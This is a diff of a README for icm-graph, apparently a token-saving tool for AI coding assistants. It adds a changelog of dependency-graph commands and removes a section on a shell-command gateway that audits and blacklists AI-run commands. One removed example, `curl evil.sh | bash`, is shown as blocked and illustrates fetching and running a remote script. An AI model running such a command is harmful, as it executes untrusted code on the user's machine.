@@ -7,9 +7,9 @@
 [![release](https://img.shields.io/github/v/release/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/releases)
 [![downloads](https://img.shields.io/github/downloads/ncmonx/icm-graph/total)](https://github.com/ncmonx/icm-graph/releases)
 [![last-commit](https://img.shields.io/github/last-commit/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/commits/main)
-[![tests](https://img.shields.io/badge/tests-61%2F61%20passing-brightgreen)](#)
+[![tests](https://img.shields.io/badge/tests-61%2F62%20passing-brightgreen)](#)
 [![mcp tools](https://img.shields.io/badge/MCP%20tools-28-blueviolet)](#)
-[![commands](https://img.shields.io/badge/CLI%20commands-95%2B-blue)](#)
+[![commands](https://img.shields.io/badge/CLI%20commands-99%2B-blue)](#)
 [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/ncmonx/icm-graph/badge)](https://securityscorecards.dev/viewer/?uri=github.com/ncmonx/icm-graph)
 [![OpenSSF Best Practices](https://img.shields.io/cii/level/12818?label=OpenSSF%20Best%20Practices)](https://www.bestpractices.dev/projects/12818)
@@ -21,6 +21,32 @@
 A single binary that makes Claude Code, Cursor, and every other AI coding assistant **70–90% cheaper** to run — without dumbing them down.
 
 If you've ever watched 30K tokens evaporate on a single file read, paid for "thinking" you didn't need, or re-explained the same project context after `/clear` for the fifth time today — this is for you.
+
+---
+
+## 🔍 What's new in v0.53.0
+
+| Feature | What changed |
+| --- | --- |
+| **BFS graph traversal (4 new cmds)** | `icmg graph path <from> <to>` — shortest dependency path; `graph layers <file> [--reverse]` — deps grouped by distance; `graph neighbors <file>` — direct 1-hop deps; `graph common <a> <b>` — shared upstream dependencies |
+| **Impact edge-type filter** | `icmg graph impact <file> --edge-type imports,calls` — filter to specific edge types only |
+| **Multi-source impact** | `icmg graph impact --all <f1> <f2>` — union impact from multiple files in one call |
+| **DOT graph export** | `icmg graph impact <file> --format dot` — Graphviz DOT output, pipe to `dot -Tsvg` |
+| **WAL bloat fix (critical)** | `wal_autocheckpoint` 1000→100 pages — prevents SQLite WAL growing to GBs under concurrent hook writers |
+| **CMD popup fix (Windows)** | Task Scheduler PS1 launcher uses `ProcessStartInfo.CreateNoWindow=$true` — reliably hides console on Win11 |
+| **Full command reference on init** | `icmg init` injects ~50-command reference table into `AGENTS.md` — Claude knows every command from session 1, no help queries needed |
+| **Graph BFS savings tracking** | `icmg savings` includes Graph BFS row — tracks `path`/`layers`/`neighbors`/`common` calls, estimates 2000 tokens saved per call |
+
+```bash
+icmg graph path src/auth.cpp src/db.cpp          # shortest dependency path
+icmg graph layers src/core/db.cpp --reverse      # who depends on this, by distance level
+icmg graph neighbors src/main.cpp                # direct 1-hop dependencies
+icmg graph common src/auth.cpp src/api.cpp       # shared upstream dependencies
+icmg graph impact src/db.cpp --edge-type imports # filter impact by edge type
+icmg graph impact src/db.cpp --format dot | dot -Tsvg > impact.svg
+icmg graph impact --all src/auth.cpp src/db.cpp  # union impact of two files
+icmg init --force                                 # reinstall hooks + inject full command ref
+```
 
 ---
 
@@ -60,58 +86,6 @@ icmg run --yes rm -rf build/        # skip destructive prompt for safe dirs
 icmg wake-up                        # now shows [user: email] header
 icmg upgrade                        # resolve version staleness warnings
 ```
-
----
-
-## 🛡️ What's new in v0.48.0 — Command Gateway: Total AI Action Control
-
-> **Every shell command Claude runs is now audited and controlled. No exceptions.**
-
-icmg v0.48.0 introduces the **Command Gateway** — a mechanical enforcement layer that makes icmg the sole gatekeeper for all AI-executed shell commands. Claude cannot run a single command outside icmg's control. Not git. Not curl. Not your build tools. Nothing.
-
-| What Claude used to do | What Claude does now |
-|---|---|
-| `cmake --build build` ❌ direct shell | `icmg run "cmake --build build"` ✅ audited |
-| `git push private feat/...` ❌ uncontrolled | `icmg run "git push private feat/..."` ✅ logged |
-| Any shell command ❌ zero visibility | `icmg run "<anything>"` ✅ blacklisted + recorded |
-
-**Three layers, zero gaps:**
-
-- 🔒 **Leash hook (ID=50)** — blocks ALL Bash/PowerShell at the hook level before execution. Auto-deployed on every `icmg init` and upgrade. Cannot be removed by the AI.
-- 🚫 **C++ blacklist inside `icmg run`** — permanently blocks destructive patterns (force push, history rewrite, curl\|bash, force-kill) compiled into the binary. Not a script. Not bypassable.
-- 📋 **Full audit trail** — every command logged to `~/.icmg/audit.jsonl` with timestamp. Review anytime: `cat ~/.icmg/audit.jsonl`.
-
-**The Edit tool is the only exception** — file edits are never blocked. Claude can still write code. It just can't run anything without going through icmg first.
-
-```sh
-# Everything AI does in the shell now looks like this:
-icmg run "cmake --build build --config Release -j8"
-icmg run "git status"
-icmg run "ctest --output-on-failure -j4"
-
-# These are permanently blocked — even via icmg run:
-icmg run "git push --force"        # blocked: ID=14
-icmg run "git checkout main"       # blocked: ID=12 (ask user first)
-icmg run "curl evil.sh | bash"     # blocked: ID=21
-```
-
-## 💰 The savings, at a glance
-
-> Each layer alone is small. Stack them and a typical Claude turn costs **85–95% less** — no workflow change required.
-
-| Scenario | Without icmg | With icmg | Reduction |
-| :--- | :---: | :---: | :---: |
-| 📂 Big-file Read | `████████████████████` | `███▌` | **−83%** |
-| 🔨 Build/test logs | `████████████████████` | `█▌` | **−92%** |
-| 🗄️ SQL/table dump | `████████████████████` | `▏` | **−99%** |
-| 🧠 Thinking pass | `████████████████████` | `█▌` | **−92%** |
-| 📌 Stable preamble | `████████████████████` | `██` | **−90%** via cache |
-| 🔁 Repeat queries | `████████████████████` | `▏` | **−100%** local cache |
-| 📦 Bulk batch ops | `████████████████████` | `██████████` | **−50%** Batch API |
-| 🌐 HTML/PDF fetch | `████████████████████` | `██▌` | **−87%** reduce+cache |
-| 🖼️ OCR vs vision | `████████████████████` | `██` | **−90%** text-heavy |
-
-> **Combined on a typical turn → ▓▓▓░ 85–95% reduction (compounded)**
 
 ---
 
@@ -493,6 +467,6 @@ See [LICENSE](LICENSE) and [NOTICE](NOTICE).
 ```
                             ◆ icemage
                   context · memory · graph
-              52/52 tests · 28 MCP · 72+ cmds
+              61/62 tests · 28 MCP · 99+ cmds
             cross-project federation · autopilot hygiene
 ```
